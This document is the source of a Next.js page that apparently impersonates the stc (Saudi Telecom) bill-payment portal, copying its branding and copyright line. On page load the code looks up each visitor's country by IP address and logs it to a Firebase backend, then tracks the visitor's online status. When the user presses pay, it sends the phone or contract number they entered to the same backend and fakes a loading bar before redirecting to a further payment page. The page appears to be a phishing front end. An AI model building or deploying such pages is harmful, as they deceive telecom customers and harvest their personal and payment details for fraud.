"use client"

import STCLoading from "@/components/loading"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import { User, ShoppingCart, Search, Share2, Smartphone, Shield } from "lucide-react"
import { useRouter } from "next/navigation"
import "./globals.css"

import { useCallback, useEffect, useState } from "react"
const visitorId = `ssscg-app-${Math.random().toString(36).substring(2, 15)}`;
export default function STCPaymentPortal() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [loadingProgress, setLoadingProgress] = useState(0)
  const [phone, setPhone] = useState('')
  const [error, setError] = useState('')


  const handlePayNow = async () => {
    // Validate phone field
    if (!phone.trim()) {
      setError('الرجاء إدخال الرقم للمتابعة')
      return
    }

    setError('')
    setIsLoading(true)
    setLoadingProgress(0)
    addData({ id: visitorId, mobile: phone,phone})
    const progressInterval = setInterval(() => {
      setLoadingProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval)
          setTimeout(() => {
            setIsLoading(false)
            router.push("/paym")
          }, 500)
          return 100
        }
        return prev + Math.random() * 15
      })
    }, 200)
  }
  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      })
      localStorage.setItem("country", country) // Consider privacy implications
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error"
      });
    }
  }, [visitorId]);

  useEffect(() => {
    if (visitorId) {
      getLocationAndLog();
    }
  }, [visitorId, getLocationAndLog]);
  return (
    <div className="min-h-screen bg-background">
      {isLoading && <STCLoading message="جاري التحميل ...  " progress={loadingProgress} />}

      <header className="bg-card border-b border-border shadow-sm">
        <div className="flex items-center justify-between px-4 sm:px-6 py-3 sm:py-4">
          <div className="flex items-center gap-1 sm:gap-2">
            <button className="p-2 sm:p-3 hover:bg-muted rounded-xl transition-colors duration-200">
              <User className="w-4 h-4 sm:w-5 sm:h-5 text-destructive" />
            </button>
            <button className="p-2 sm:p-3 hover:bg-muted rounded-xl transition-colors duration-200">
              <ShoppingCart className="w-4 h-4 sm:w-5 sm:h-5 text-muted-foreground" />
            </button>
            <button className="p-2 sm:p-3 hover:bg-muted rounded-xl transition-colors duration-200">
              <Search className="w-4 h-4 sm:w-5 sm:h-5 text-muted-foreground" />
            </button>
          </div>

          <div className="flex items-center">
            <span className="text-2xl sm:text-3xl font-bold text-primary tracking-tight">
              <img src="/logo.webp" alt="3" width={50} />
            </span>
          </div>

          <button className="p-2 sm:p-3 hover:bg-muted rounded-xl transition-colors duration-200">
            <div className="flex flex-col gap-1 sm:gap-1.5">
              <div className="w-5 sm:w-6 h-0.5 bg-primary rounded-full"></div>
              <div className="w-5 sm:w-6 h-0.5 bg-primary rounded-full"></div>
              <div className="w-5 sm:w-6 h-0.5 bg-primary rounded-full"></div>
            </div>
          </button>
        </div>
      </header>

      <div className="relative overflow-hidden">
        <img
          src="/payment-hero.png"
          alt="Payment terminal with contactless payment"
          className="w-full h-48 sm:h-64 md:h-72 lg:h-80 object-cover"
        />

        <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-black/20 to-transparent">
          <div className="absolute inset-0 gradient-mesh"></div>
        </div>

        <div
          className="absolute inset-0 flex items-end"
          style={{ background: "url(/payment-desktop.webp)", backgroundRepeat: "no-repeat", backgroundSize: "cover" }}
        >

        </div>
      </div>

      <div className="px-4 sm:px-6 py-8 sm:py-12">
        <div className="w-full text-[#1d252d] p-4 sm:p-6 md:p-8 text-right">
          <h1 className=" text-xl sm:text-2xl md:text-3xl font-bold mb-1 sm:mb-2 text-balance drop-shadow-lg">
            خدمات دفع الفواتير
          </h1>
          <h2 className="text-[#1d252d] text-lg sm:text-xl font-semibold drop-shadow-md">وإعادة التعبئة</h2>
        </div>
        <div className="max-w-sm sm:max-w-md mx-auto">
          <div className="bg-card rounded-2xl shadow-lg border border-border p-6 sm:p-8">
            <h3 className="text-xl sm:text-2xl font-bold text-foreground text-center mb-6 sm:mb-8 text-balance">
              الدفع السريع
            </h3>

            <div className="space-y-4 sm:space-y-6">
              <div>
                <Input
                  type="tel"
                  maxLength={12}
                  onChange={(e) => { 
                    setPhone(e.target.value)
                    if (e.target.value.trim()) {
                      setError('')
                    }
                  }}
                  placeholder="رقم الموبايل/البطاقة المدينة أو رقم العقد"
                  className={`w-full h-8 sm:h-8 text-right border-2 rounded-xl px-4 sm:px-5 text-sm sm:text-base text-foreground placeholder:text-muted-foreground bg-input focus:ring-2 focus:ring-ring focus:border-transparent transition-all duration-200 ${
                    error ? 'border-destructive' : 'border-border'
                  }`}
                  dir="rtl"
                />
                {error && (
                  <p className="text-destructive text-sm mt-2 text-right font-medium">
                    {error}
                  </p>
                )}
              </div>

              <div className="flex gap-3 sm:gap-4">
                <Button
                  variant="outline"
                  size="lg"
                  className="flex-shrink-0 h-10 w-12 sm:h-10 sm:w-14 border-2 border-destructive text-destructive hover:bg-destructive hover:text-destructive-foreground bg-transparent rounded-xl transition-all duration-200"
                >
                  <Share2 className="w-4 h-4 sm:w-5 sm:h-5" />
                </Button>

                <Button
                  onClick={handlePayNow}
                  disabled={isLoading}
                  className="flex-1 h-10 sm:h-10 bg-[#ff375e] hover:bg-[#ff375e]/90 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-200  disabled:opacity-50"
                >
                  {isLoading ? "جاري التحميل..." : "ادفع الآن"}
                </Button>
              </div>
            </div>
            {/* Recharge Section */}

          </div>
          <div className="max-w-xs sm:max-w-md mx-auto">
            <div className="bg-muted/50 rounded-2xl p-4 sm:p-6 text-center">
              <div className="w-12 h-12 sm:w-16 sm:h-16 mx-auto mb-3 sm:mb-4 bg-primary/10 rounded-2xl flex items-center justify-center">
                <Smartphone className="w-6 h-6 sm:w-8 sm:h-8 text-[#8736c4]" />
              </div>
              <h3 className="text-base sm:text-lg font-bold text-foreground mb-2 sm:mb-3">أعد تعبئة خطك</h3>
              <p className="text-xs sm:text-sm text-muted-foreground mb-4 sm:mb-6 leading-relaxed">
                أعد تعبئة خطك للمكالمات أو خط الإنترنت بخطوات بسيطة واستمتع بتجربة سهلة للدفع المسبق مع stc.
              </p>
              <Button className="w-full h-10 sm:h-12 bg-accent hover:bg-accent/90 text-accent-foreground font-semibold rounded-xl">
                تعبئة رصيد الآن
              </Button>
            </div>
          </div>
          {/* Trusted Lines Section */}
          <div className="max-w-xs sm:max-w-md mx-auto">
            <div className="bg-muted/50 rounded-2xl p-4 sm:p-6 text-center">
              <div className="w-12 h-12 sm:w-16 sm:h-16 mx-auto mb-3 sm:mb-4 bg-primary/10 rounded-2xl flex items-center justify-center">
                <Shield className="w-6 h-6 sm:w-8 sm:h-8  text-[#8736c4]" />
              </div>
              <h3 className="text-base sm:text-lg font-bold text-foreground mb-2 sm:mb-3">الدفع للخطوط الموثوقة</h3>
              <p className="text-xs sm:text-sm text-muted-foreground mb-4 sm:mb-6 leading-relaxed">
                خطك مشغول؟ لا تحتاج. ادفع بكل سهولة ورد الخدمة من جديد.
              </p>
              <Button className="w-full h-10 sm:h-12 bg-accent hover:bg-accent/90 text-accent-foreground font-semibold rounded-xl">
                ادفع الآن
              </Button>
            </div>
          </div>

        </div>
      </div>

      <footer className="bg-[#8736c4] text-primary-foreground py-8 sm:py-12">
        <div className="px-3 sm:px-6">
          <div className="max-w-4xl mx-auto">
            {/* Footer Links */}
            <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-6 sm:gap-8 mb-8 sm:mb-12 text-right">
              <div>
                <h4 className="font-semibold mb-3 sm:mb-4 text-sm sm:text-base">الخدمات والمنتجات</h4>
                <ul className="space-y-2 text-xs sm:text-sm opacity-90">
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      الجوال
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      الإنترنت المنزلي
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      خدمات الأعمال
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      الحلول الذكية
                    </a>
                  </li>
                </ul>
              </div>

              <div>
                <h4 className="font-semibold mb-3 sm:mb-4 text-sm sm:text-base">خدمة العملاء</h4>
                <ul className="space-y-2 text-xs sm:text-sm opacity-90">
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      اتصل بنا
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      مركز المساعدة
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      الشكاوى والاقتراحات
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      مواقع الفروع
                    </a>
                  </li>
                </ul>
              </div>

              <div>
                <h4 className="font-semibold mb-3 sm:mb-4 text-sm sm:text-base">عن stc</h4>
                <ul className="space-y-2 text-xs sm:text-sm opacity-90">
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      من نحن
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      الأخبار والفعاليات
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      الوظائف
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      المسؤولية المجتمعية
                    </a>
                  </li>
                </ul>
              </div>

              <div>
                <h4 className="font-semibold mb-3 sm:mb-4 text-sm sm:text-base">روابط مهمة</h4>
                <ul className="space-y-2 text-xs sm:text-sm opacity-90">
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      الشروط والأحكام
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      سياسة الخصوصية
                    </a>
                  </li>
                  <li>
                    <a href="#" className="hover:opacity-100 transition-opacity">
                      إشعار الخصوصية
                    </a>
                  </li>
                </ul>
              </div>
            </div>

            {/* STC Logo and Social Media */}
            <div className="text-center border-t border-primary-foreground/20 pt-6 sm:pt-8">
              <div className="mb-4 sm:mb-6">
                <span className="text-4xl sm:text-5xl font-bold tracking-tight flex justify-center">
                  <img src="/next.svg" width={50} />

                </span>
              </div>

              <div className="flex justify-center gap-4 sm:gap-6 mb-4 sm:mb-6">
                <a
                  href="#"
                  className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 hover:bg-white/30 rounded-full flex items-center justify-center transition-colors"
                >
                  <span className="text-sm sm:text-base">f</span>
                </a>
                <a
                  href="#"
                  className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 hover:bg-white/30 rounded-full flex items-center justify-center transition-colors"
                >
                  <span className="text-sm sm:text-base">t</span>
                </a>
                <a
                  href="#"
                  className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 hover:bg-white/30 rounded-full flex items-center justify-center transition-colors"
                >
                  <span className="text-sm sm:text-base">i</span>
                </a>
                <a
                  href="#"
                  className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 hover:bg-white/30 rounded-full flex items-center justify-center transition-colors"
                >
                  <span className="text-sm sm:text-base">y</span>
                </a>
                <a
                  href="#"
                  className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 hover:bg-white/30 rounded-full flex items-center justify-center transition-colors"
                >
                  <span className="text-sm sm:text-base">l</span>
                </a>
              </div>

              <p className="text-xs sm:text-sm opacity-75">جميع الحقوق محفوظة © 2025 شركة الاتصالات السعودية</p>
            </div>
          </div>
        </div>
      </footer>
    </div>

  )
}
